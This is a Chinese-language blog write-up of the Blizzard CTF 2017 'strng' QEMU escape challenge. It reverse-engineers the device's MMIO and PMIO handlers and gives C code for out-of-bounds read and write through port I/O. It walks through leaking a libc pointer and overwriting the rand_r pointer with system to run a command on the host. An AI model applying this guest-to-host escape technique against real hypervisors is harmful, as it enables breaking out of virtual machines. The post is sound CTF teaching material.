---
layout: post
title:  "qemu pwn-Blizzard CTF 2017 Strng writeup"
date:   2019-11-03 21:00:00
categories: vm-escape
permalink: /archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup
---

这题其实是学习qemu的第二题，第一题是[HITB GSEC 2017: babyqemu](https://kitctf.de/writeups/hitb2017/babyqemu)，但是当时做它的时候其实对qemu基本上是啥也不了解（虽然现在也不太清楚，但是稍微有点基础了），所以此题应该算是第一题吧。

通过这题巩固了之前看的qemu的基础知识部分，包括MMIO、PMIO以及QOM编程模型等，这题的特色在于它的漏洞不是存在于MMIO中，而是PMIO中。

## 描述

题目源码的链接为[Blizzard CTF 2017](https://github.com/rcvalle/blizzardctf2017)，是qemu逃逸题，`flag`文件在宿主机中的路径为`/root/flag`。

题目的下载路径为[release](https://github.com/rcvalle/blizzardctf2017/releases)，启动的命令如下，可以把它保存到`launsh.sh`中，用`sudo ./launsh.sh`启动。

```bash
./qemu-system-x86_64 \
    -m 1G \
    -device strng \
    -hda my-disk.img \
    -hdb my-seed.img \
    -nographic \
    -L pc-bios/ \
    -enable-kvm \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::5555-:22
```

该虚拟机是一个`Ubuntu Server 14.04 LTS`，用户名是`ubuntu`，密码是`passw0rd`。因为它把22端口重定向到了宿主机的5555端口，所以可以使用`ssh ubuntu@127.0.0.1 -p 5555`登进去。

## 分析

`sudo ./launsh.sh`启动虚拟机，使用用户名是`ubuntu`，密码是`passw0rd`进去虚拟机。

同时将`qemu-system-x64_64`拖到IDA里面，程序较大，IDA需要个小一会才会分析完成。后续整个分析过程是通过IDA与源码对比查看完成，需要指出的是分析过程将IDA中将变量设置成其对应的结构体会容易看很多。

在IDA分析完成之前，首先看下虚拟机中的设备等信息。

```bash
ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```

通过启动命令中的`-device strng`，我们在IDA中搜索`strng`相关函数，可以看到相应的函数。

![strng-related-function](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2019-11-03-qemu-pwn-Blizzard-CTF-2017-Strng-writeup/strng-related-function.png)

首先是设备的结构体`STRNGState `的定义：

```c
00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, mappedto_3815)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 regs            dd 64 dup(?)
00000BF4                 db ? ; undefined
00000BF5                 db ? ; undefined
00000BF6                 db ? ; undefined
00000BF7                 db ? ; undefined
00000BF8 srand           dq ?                    ; offset
00000C00 rand            dq ?                    ; offset
00000C08 rand_r          dq ?                    ; offset
00000C10 STRNGState      ends
```

可以看到它里面存在一个`regs`数组，大小为256（64*4），后面跟三个函数指针。

由上篇文章我们知道了`pci_strng_register_types`会注册由用户提供的`TypeInfo`，查看该函数并找到了它的`TypeInfo`，跟进去看到了`strng_class_init`以及`strng_instance_init`函数。

然后先看`strng_class_init`函数，代码如下（将变量k的类型设置为PCIDeviceClass*）：

```c
void __fastcall strng_class_init(ObjectClass *a1, void *data)
{
  PCIDeviceClass *k; // rax

  k = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                          a1,
                          "pci-device",
                          "/home/rcvalle/qemu/hw/misc/strng.c",
                          154,
                          "strng_class_init");
  k->device_id = 0x11E9;
  k->revision = 0x10;
  k->realize = (void (*)(PCIDevice_0 *, Error_0 **))pci_strng_realize;
  k->class_id = 0xFF;
  k->vendor_id = 0x1234;
}
```

可以看到`class_init`中设置其`device_id`为`0x11e9`，`vendor_id`为`0x1234`。对应到上面`lspci`得到的信息，可以知道设备为`00:03.0`，查看其详细信息：

```bash
ubuntu@ubuntu:~$ lspci -v -s 00:03.0
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
```

可以看到有MMIO地址为`0xfebf1000`，大小为256；PMIO地址为`0xc050`，总共有8个端口。

然后查看`resource`文件：

```bash
root@ubuntu:~# cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

`resource0`对应的是MMIO，而`resource1`对应的是PMIO。`resource`中数据格式是`start-address end-address flags`。

也可以查看`/proc/ioports`来查看各个设备对应的I/O端口，`/proc/iomem`查看其对应的I/O memory地址（需要用root帐号查看，否则看不到端口或地址）：

```bash
ubuntu@ubuntu:~$ sudo cat /proc/iomem
...
  febf1000-febf10ff : 0000:00:03.0
...
ubuntu@ubuntu:~$ sudo cat /proc/ioports
...
  c050-c057 : 0000:00:03.0

```

`/sys/devices`其对应的设备下也有相应的信息，如`deviceid`和`vendorid`等：

```bash
ubuntu@ubuntu:~$ ls /sys/devices/pci0000\:00/0000\:00\:03.0
broken_parity_status      enable         power      subsystem_device
class                     firmware_node  remove     subsystem_vendor
config                    irq            rescan     uevent
consistent_dma_mask_bits  local_cpulist  resource   vendor
d3cold_allowed            local_cpus     resource0
device                    modalias       resource1
dma_mask_bits             msi_bus        subsystem
ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/class
0x00ff00
ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/vendor
0x1234
ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/device
0x11e9
```

看完`strng_class_init`后，看`strng_instance_init`函数，该函数则是为`strng` Object赋值了相应的函数指针值`srand`、`rand`以及`rand_r`。

然后去看`pci_strng_realize`，该函数注册了MMIO和PMIO空间，包括mmio的操作结构`strng_mmio_ops`及其大小`256`；pmio的操作结构体`strng_pmio_ops`及其大小8。

```c
void __fastcall pci_strng_realize(STRNGState *pdev, Error_0 **errp)
{
  unsigned __int64 v2; // ST08_8

  v2 = __readfsqword(0x28u);
  memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &strng_mmio_ops, pdev, "strng-mmio", 0x100uLL);
  pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  memory_region_init_io(&pdev->pmio, &pdev->pdev.qdev.parent_obj, &strng_pmio_ops, pdev, "strng-pmio", 8uLL);
  if ( __readfsqword(0x28u) == v2 )
    pci_register_bar(&pdev->pdev, 1, 1u, &pdev->pmio);
}
```

`strng_mmio_ops`中有访问mmio对应的`strng_mmio_read`以及`strng_mmio_write`；`strng_pmio_ops`中有访问pmio对应的`strng_pmio_read`以及`strng_pmio_write`，下面将详细分析这两部分，一般来说，设备的问题也容易出现在这两个部分。

### MMIO

#### strng_mmio_read

```c
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = opaque->regs[addr >> 2];
  return result;
}
```

读入addr将其右移两位，作为`regs`的索引返回该寄存器的值。

#### strng_mmio_write

```c
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint32_t val, unsigned int size)
{
  hwaddr i; // rsi
  uint32_t v5; // ST08_4
  uint32_t v6; // eax
  unsigned __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  if ( size == 4 && !(addr & 3) )
  {
    i = addr >> 2;
    if ( (_DWORD)i == 1 )
    {
      opaque->regs[1] = opaque->rand(opaque, i, val);
    }
    else if ( (unsigned int)i < 1 )
    {
      if ( __readfsqword(0x28u) == v7 )
        opaque->srand(val);
    }
    else
    {
      if ( (_DWORD)i == 3 )
      {
        v5 = val;
        v6 = ((__int64 (__fastcall *)(uint32_t *))opaque->rand_r)(&opaque->regs[2]);
        val = v5;
        opaque->regs[3] = v6;
      }
      opaque->regs[(unsigned int)i] = val;
    }
  }
}
```

当`size`等于4时，将`addr`右移两位得到寄存器的索引`i`，并提供4个功能：

* 当`i`为0时，调用`srand`函数但并不给赋值给内存。
* 当`i`为1时，调用rand得到随机数并赋值给`regs[1]`。
* 当`i`为3时，调用`rand_r`函数，并使用`regs[2]`的地址作为参数，并最后将返回值赋值给`regs[3]`，但后续仍然会将`val`值覆盖到`regs[3]`中。
* 其余则直接将传入的`val`值赋值给`regs[i]`。

看起来似乎是`addr`可以由我们控制，可以使用`addr`来越界读写`regs`数组。即如果传入的addr大于regs的边界，那么我们就可以读写到后面的函数指针了。但是事实上是不可以的，前面已经知道了`mmio`空间大小为256，我们传入的addr是不能大于`mmio`的大小；因为pci设备内部会进行检查，而刚好`regs`的大小为256，所以我们无法通过`mmio`进行越界读写。

#### 编程访问MMIO

实现对MMIO空间的访问，比较便捷的方式就是使用`mmap`函数将设备的`resource0`文件映射到内存中，再进行相应的读写即可实现MMIO的读写，典型代码如下：

```c

unsigned char* mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");
}
```

### PMIO

通过前面的分析我们知道`strng`有八个端口，端口起始地址为`0xc050`，相应的通过`strng_pmio_read`和`strng_pmio_write`去读写。

#### strng_pmio_read

```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t reg_addr; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        reg_addr = opaque->addr;
        if ( !(reg_addr & 3) )
          result = opaque->regs[reg_addr >> 2];
      }
    }
    else
    {
      result = opaque->addr;
    }
  }
  return result;
}
```

当端口地址为0时直接返回`opaque->addr`，否则将`opaque->addr`右移两位作为索引`i`，返回`regs[i]`的值，比较关注的是这个`opaque->addr`在哪里赋值，它在下面的`strng_pmio_write`中被赋值。

#### strng_pmio_write

```c
void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t reg_addr; // eax
  __int64 idx; // rax
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        reg_addr = opaque->addr;
        if ( !(reg_addr & 3) )
        {
          idx = reg_addr >> 2;
          if ( (_DWORD)idx == 1 )
          {
            opaque->regs[1] = opaque->rand(opaque, 4LL, val);
          }
          else if ( (unsigned int)idx < 1 )
          {
            if ( __readfsqword(0x28u) == v6 )
              opaque->srand((unsigned int)val);
          }
          else if ( (_DWORD)idx == 3 )
          {
            opaque->regs[3] = opaque->rand_r(&opaque->regs[2], 4LL, val);
          }
          else
          {
            opaque->regs[idx] = val;
          }
        }
      }
    }
    else
    {
      opaque->addr = val;
    }
  }
}
```

当`size`等于4时，以传入的端口地址为判断提供4个功能：

* 当端口地址为0时，直接将传入的`val`赋值给`opaque->addr`。

* 当端口地址不为0时，将`opaque->addr`右移两位得到索引`i`，分为三个功能：

  * `i`为0时，执行`srand`，返回值不存储。

  * `i`为1时，执行`rand`并将返回结果存储到`regs[1]`中。
  * `i`为3时，调用`rand_r`并将`regs[2]`作为第一个参数，返回值存储到`regs[3]`中。
  * 否则直接将`val`存储到`regs[idx]`中。

可以看到PMIO与MMIO的区别在于索引`regs`数组时，PMIO并不是由直接传入的端口地址`addr`去索引的；而是由`opaque->addr`去索引，而`opaque->addr`的赋值是我们可控的（端口地址为0时，直接将传入的`val`赋值给`opaque->addr`）。因此`regs`数组的索引可以为任意值，即可以越界读写。

越界读则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后再调用`pmio_read`去越界读。

越界写则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后仍然通过`pmio_write`去越界写。

#### 编程访问PMIO

[UAFIO](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)描述说有三种方式访问PMIO，这里仍给出一个比较便捷的方法去访问，即通过`IN`以及 `OUT`指令去访问。可以使用`IN`和`OUT`去读写相应字节的1、2、4字节数据（outb/inb, outw/inw, outl/inl），函数的头文件为`<sys/io.h>`，函数的具体用法可以使用`man`手册查看。

还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于`0x000-0x3ff`之间的端口，使用`ioperm(from, num, turn_on)`即可；对于`0x3ff`以上的端口，则该调用执行`iopl(3)`函数去允许访问所有的端口（可使用`man ioperm` 和`man iopl`去查看函数）。

典型代码如下：

```c

uint32_t pmio_base=0xc050;

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");
        pmio_write(pmio_base+0,0);
    pmio_write(pmio_base+4,1);
 
}
```

## 利用

首先是利用pmio来进行任意读写。

* 越界读：首先使用`strng_pmio_write`设置`opaque->addr`，即当`addr`为0时，传入的`val`会直接赋值给`opaque->addr`；然后再调用`strng_pmio_read`，就会去读`regs[val>>2]`的值，实现越界读，代码如下：

  ```c
  uint32_t pmio_arbread(uint32_t offset)
  {
      pmio_write(pmio_base+0,offset);
      return pmio_read(pmio_base+4);
  }
  ```

* 越界写：仍然是首先使用`strng_pmio_write`设置`opaque->addr`，即当`addr`为0时，传入的`val`会直接赋值给`opaque->addr`；然后调用`strng_pmio_write`，并设置`addr`为4，即会去将此次传入的`val`写入到`regs[val>>2]`中，实现越界写，代码如下：

  ```c
  void pmio_abwrite(uint32_t offset, uint32_t value)
  {
      pmio_write(pmio_base+0,offset);
      pmio_write(pmio_base+4,value);
  }
  ```

完整的利用过程为：

1. 使用`strng_mmio_write`将`cat /root/flag`写入到`regs[2]`开始的内存处，用于后续作为参数。
2. 使用越界读漏洞，读取`regs`数组后面的`srand`地址，根据偏移计算出`system`地址。
3. 使用越界写漏洞，覆盖`regs`数组后面的`rand_r`地址，将其覆盖为`system`地址。
4. 最后使用`strng_mmio_write`触发执行`opaque->rand_r(&opaque->regs[2])`函数，从而实现`system("cat /root/flag")`的调用，拿到flag。

### 调试

将完整流程描述了一遍以后，再说下怎么调试。

`sudo ./launsh.sh`将虚拟机跑起来以后，在本地将[exp](https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c)用命令`make`编译通过，`makefile`内容比较简单：

```bash
ALL:
        cc -m32 -O0 -static -o exp exp.c
```

然后使用命令`scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu`将exp拷贝到虚拟机中。

若要调试qemu以查看相应的流程，可以使用`ps -ax|grep qemu`找到相应的进程；再`sudo gdb -attach [pid]`上去，然后在里面下断点查看想观察的数据，示例如下：

```bash
b *strng_pmio_write
b *strng_pmio_read
b *strng_mmio_write
b *strng_pmio_read
```

然后再`sudo ./exp`执行exp，就可以愉快的调试了。

一个小trick，可以使用`print`加上结构体可以很方便的查看数据（如果有符号的话）：

```bash
pwndbg> print *(STRNGState*)$rdi
$1 = {
  pdev = {
    qdev = {
      parent_obj = {
        class = 0x55de43a3f2e0,
        free = 0x7fc137fedba0 <g_free>,
        properties = 0x55de45283c00,
        ref = 0x13,
...
pwndbg> print ((STRNGState*)$rdi).regs
$3 = {0x0, 0x0, 0x1e28b6de, 0x6f6f722f, 0x6c662f74, 0x6761, 0x0 <repeats 58 times>}
```

最后可以看到成功的拿到了宿主机下面的flag：

```bash
leaking srandom addr: 0x7fc137211bb0
libc base: 0x7fc1371ce000
system addr: 0x7fc13721d440
leaking heap addr: 0x55de43b35ef0
parameter addr: 0x55de43b6fb6c
flag{welcome_to_the_qeme_world}
```

## 小结

学到了很多的东西，也看到了很多的东西要学。

相关文件和脚本[链接](https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/BlizzardCTF2017-Strng)

## 参考链接

1. [Blizzard CTF 2017: Sombra True Random Number Generator (STRNG)](https://github.com/rcvalle/blizzardctf2017)
2. [BlizzardCTF 2017 - Strng](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)
3. [Blizzard CTF 2017 Strng](https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/)

文章先发于[先知](https://xz.aliyun.com/t/6562)社区。

